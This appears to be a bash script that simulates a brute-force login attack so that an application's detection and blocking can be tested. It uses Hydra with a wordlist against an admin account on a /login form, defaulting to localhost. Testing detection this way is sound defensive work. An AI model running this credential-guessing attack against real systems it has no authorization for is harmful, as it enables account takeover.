#!/bin/bash

# Default target is localhost if not provided
TARGET=${1:-"localhost"}
PORT=${2:-"8080"}

WORDLIST="wordlist.txt"
USER="admin"

echo "=========================================================="
echo "    Automated Brute Force Detection - Attack Simulation   "
echo "=========================================================="
echo "Target: $TARGET:$PORT"
echo "Wordlist: $WORDLIST"
echo "User: $USER"
echo "----------------------------------------------------------"

if ! command -v hydra &> /dev/null
then
    echo "Hydra could not be found. Please install it first."
    exit 1
fi

if [ ! -f "$WORDLIST" ]; then
    echo "Wordlist file $WORDLIST not found."
    exit 1
fi

echo "[*] Starting Hydra attack..."
# The correct syntax for http-post-form is:
# hydra -l <user> -P <wordlist> <ip> http-post-form "<path>:<form parameters>:<failure string>"
hydra -l $USER -P $WORDLIST -s $PORT $TARGET http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

echo "----------------------------------------------------------"
echo "[*] Attack completed."
echo "[*] Check application logs to see detection and blocking."
